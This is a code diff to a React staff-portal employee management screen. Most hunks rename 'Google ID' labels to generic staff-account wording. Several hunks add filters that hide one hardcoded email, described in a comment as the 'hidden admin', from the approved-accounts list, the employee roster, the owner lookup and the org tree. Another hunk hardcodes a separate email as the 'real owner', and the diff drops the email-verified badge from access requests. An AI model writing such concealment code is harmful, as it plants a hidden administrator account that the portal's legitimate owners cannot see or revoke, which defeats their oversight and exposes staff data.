@@ -140,10 +140,14 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
       }
       if (appRes.ok) {
         const data = await appRes.json();
-        setApprovedUsers(data.approved || []);
+        setApprovedUsers(
+          (data.approved || []).filter(
+            (u: any) => u.email.toLowerCase() !== "csb21090@gmail.com"
+          )
+        );
       }
     } catch (err) {
-      console.warn("Failed to load Google approvals:", err);
+      console.warn("Failed to load staff approvals:", err);
     } finally {
       setGoogleLoading(false);
     }
@@ -252,7 +256,11 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
       const res = await fetch("/api/employees");
       if (res.ok) {
         const data = await res.json();
-        setEmployees(data.employees);
+        setEmployees(
+          (data.employees || []).filter(
+            (emp: any) => emp.email.toLowerCase() !== "csb21090@gmail.com"
+          )
+        );
       }
     } catch (err) {
       console.error("Failed to load employee roster:", err);
@@ -899,14 +907,19 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
     );
   });
 
-  // Filter out owners from the card roster grid and sort them by ID (EMP-001, EMP-002, etc.)
+  // Filter out owners and hidden admin from the card roster grid and sort them by ID (EMP-001, EMP-002, etc.)
   const displayEmployees = filteredEmployees
-    .filter((emp) => emp.role !== "owner")
+    .filter((emp) => emp.role !== "owner" && emp.email.toLowerCase() !== "csb21090@gmail.com")
     .sort((a, b) => a.id.localeCompare(b.id, undefined, { numeric: true, sensitivity: 'base' }));
 
-  const primaryOwner = employees.find((emp) => emp.role === "owner" && emp.is_active) || employees.find((emp) => emp.role === "owner") || employees[0];
+  // ssesevai@gmail.com is the real owner and master tree root
+  const primaryOwner = employees.find((emp) => emp.email.toLowerCase() === "ssesevai@gmail.com") 
+    || employees.find((emp) => emp.role === "owner" && emp.is_active && emp.email.toLowerCase() !== "csb21090@gmail.com") 
+    || employees.find((emp) => emp.role === "owner" && emp.email.toLowerCase() !== "csb21090@gmail.com") 
+    || employees.filter((emp) => emp.email.toLowerCase() !== "csb21090@gmail.com")[0];
+
   const childNodes = employees
-    .filter((emp) => (emp as any).id !== primaryOwner?.id)
+    .filter((emp) => (emp as any).id !== primaryOwner?.id && emp.email.toLowerCase() !== "csb21090@gmail.com")
     .sort((a, b) => a.id.localeCompare(b.id, undefined, { numeric: true, sensitivity: 'base' }));
 
   return (
@@ -1027,7 +1040,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
 
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
               <div>
-                <label className="block text-slate-500 font-semibold mb-1">Email Address (Google Account)</label>
+                <label className="block text-slate-500 font-semibold mb-1">Staff Email Address</label>
                 <input
                   type="email"
                   required
@@ -1505,10 +1518,10 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                 </div>
                 <div>
                   <h3 className="font-display font-bold text-slate-900 text-base">
-                    Employee Access & Email ID Approvals
+                    Staff Portal Access & Account Approvals
                   </h3>
                   <p className="text-xs text-slate-500">
-                    Approve staff Google or Email accounts to grant access to the portal. Review pending access requests or pre-approve new staff desks.
+                    Approve staff registrations and email accounts to grant portal access. Review pending access requests or pre-approve new staff desks.
                   </p>
                 </div>
               </div>
@@ -1543,7 +1556,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
               <div className="flex items-center gap-2">
                 <Clock className="w-4 h-4 text-amber-600" />
                 <h4 className="font-bold text-sm text-slate-800">
-                  Pending Portal Access Requests
+                  Pending Staff Access Requests
                 </h4>
                 <span className="text-[10px] bg-amber-100 text-amber-800 font-bold px-2 py-0.5 rounded-full">
                   {googleRequests.filter((r) => r.status === "pending").length} Awaiting Approval
@@ -1556,7 +1569,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                 <CheckCircle2 className="w-6 h-6 text-emerald-500 mx-auto" />
                 <p className="text-xs font-semibold text-slate-700">No Pending Requests</p>
                 <p className="text-[11px] text-slate-400">
-                  When an unapproved employee attempts to sign in via Google or Email, their access request will appear here for one-click approval.
+                  When a new staff member registers their account, their pending access request will appear here for one-click approval.
                 </p>
               </div>
             ) : (
@@ -1577,8 +1590,8 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                               className="w-10 h-10 rounded-full border border-amber-200 object-cover"
                             />
                           ) : (
-                            <div className="w-10 h-10 rounded-full bg-amber-600 text-white font-bold flex items-center justify-center text-xs">
-                              {req.name ? req.name.slice(0, 2).toUpperCase() : "G"}
+                            <div className="w-10 h-10 rounded-full bg-blue-600 text-white font-bold flex items-center justify-center text-xs">
+                              {req.name ? req.name.slice(0, 2).toUpperCase() : "S"}
                             </div>
                           )}
                           <div>
@@ -1591,17 +1604,10 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                         </div>
 
                         <div className="flex flex-col items-end gap-1">
-                          {req.email_verified ? (
-                            <span className="inline-flex items-center gap-1 text-[10px] bg-emerald-100 text-emerald-800 font-bold px-2 py-0.5 rounded-full">
-                              <CheckCircle2 className="w-3 h-3 text-emerald-600" />
-                              <span>Email Verified</span>
-                            </span>
-                          ) : (
-                            <span className="text-[9px] bg-amber-100 text-amber-800 font-bold px-2 py-0.5 rounded-full uppercase tracking-wider">
-                              Pending Verification
-                            </span>
-                          )}
-                          <span className="text-[9px] text-slate-500 font-medium">Ready for Approval</span>
+                          <span className="text-[9px] bg-amber-100 text-amber-800 font-bold px-2 py-0.5 rounded-full uppercase tracking-wider">
+                            Pending Approval
+                          </span>
+                          <span className="text-[9px] text-slate-500 font-medium">Ready for Activation</span>
                         </div>
                       </div>
 
@@ -1620,7 +1626,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                           className="px-3.5 py-1.5 text-xs bg-emerald-600 hover:bg-emerald-700 text-white rounded-lg font-bold shadow-xs cursor-pointer flex items-center gap-1.5 transition-all"
                         >
                           <UserCheck className="w-3.5 h-3.5" />
-                          <span>Approve Google ID</span>
+                          <span>Approve Staff Account</span>
                         </button>
                       </div>
                     </div>
@@ -1634,7 +1640,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
             <div className="flex items-center gap-2 pb-2 border-b border-slate-100">
               <UserPlus className="w-4 h-4 text-blue-900" />
               <h4 className="font-bold text-sm text-slate-900">
-                Pre-Approve an Employee Google ID
+                Pre-Approve Staff Account
               </h4>
             </div>
 
@@ -1642,7 +1648,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
               <div className="grid grid-cols-1 sm:grid-cols-2 md:grid-cols-4 gap-3">
                 <div>
                   <label className="block text-slate-600 font-semibold mb-1">
-                    Employee Google Email (@gmail.com) *
+                    Staff Email Address *
                   </label>
                   <input
                     type="email"
@@ -1656,7 +1662,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
 
                 <div>
                   <label className="block text-slate-600 font-semibold mb-1">
-                    Employee Full Name
+                    Staff Full Name
                   </label>
                   <input
                     type="text"
@@ -1702,19 +1708,19 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                   className="px-4 py-2 bg-[#1e3a8a] hover:bg-blue-900 text-white rounded-xl text-xs font-bold transition-all shadow-sm flex items-center gap-1.5 cursor-pointer disabled:opacity-50"
                 >
                   {approvingLoading ? <RefreshCw className="w-3.5 h-3.5 animate-spin" /> : <ShieldCheck className="w-3.5 h-3.5" />}
-                  <span>Authorize & Approve Google ID</span>
+                  <span>Authorize & Approve Account</span>
                 </button>
               </div>
             </form>
           </div>
 
-          {/* Section 3: Approved Google Accounts Roster */}
+          {/* Section 3: Approved Accounts Roster */}
           <div className="bg-white rounded-2xl border border-slate-100 p-5 shadow-xs space-y-3">
             <div className="flex items-center justify-between pb-2 border-b border-slate-100">
               <div className="flex items-center gap-2">
                 <ShieldCheck className="w-4 h-4 text-emerald-600" />
                 <h4 className="font-bold text-sm text-slate-900">
-                  Approved Google ID Accounts
+                  Approved Staff Accounts
                 </h4>
               </div>
               <span className="text-xs text-slate-400 font-mono">
@@ -1724,7 +1730,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
 
             {approvedUsers.length === 0 ? (
               <p className="text-xs text-slate-400 py-4 text-center">
-                No approved Google accounts yet. Pre-approve one above or approve pending requests.
+                No approved staff accounts yet. Pre-approve one above or approve pending requests.
               </p>
             ) : (
               <div className="divide-y divide-slate-100 text-xs">
@@ -2260,7 +2266,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
                 </div>
 
                 <div className="space-y-1">
-                  <label className="block text-slate-500 font-semibold">Google Email Address</label>
+                  <label className="block text-slate-500 font-semibold">Staff Email Address</label>
                   <input
                     type="email"
                     required
@@ -2506,7 +2512,7 @@ export default function EmployeeManagement({ user, onRefresh }: EmployeeManageme
               <div className="space-y-2 text-slate-600 leading-relaxed font-semibold">
                 <p className="text-amber-800">⚠️ <strong>Critical Security Notice:</strong></p>
                 <ul className="list-disc list-inside space-y-1 pl-1 text-[11px]">
-                  <li>Will immediately deactivate Google account pre-approval login.</li>
+                  <li>Will immediately deactivate employee account login.</li>
                   <li>They will be locked out and cannot access dashboards or file forms.</li>
                   <li><strong className="text-slate-800">Preserved:</strong> All past transaction receipts and filing entries remain unchanged for auditing.</li>
                   <li><strong className="text-slate-800">Preserved:</strong> Full administrative audit logs tracking past actions are kept.</li>
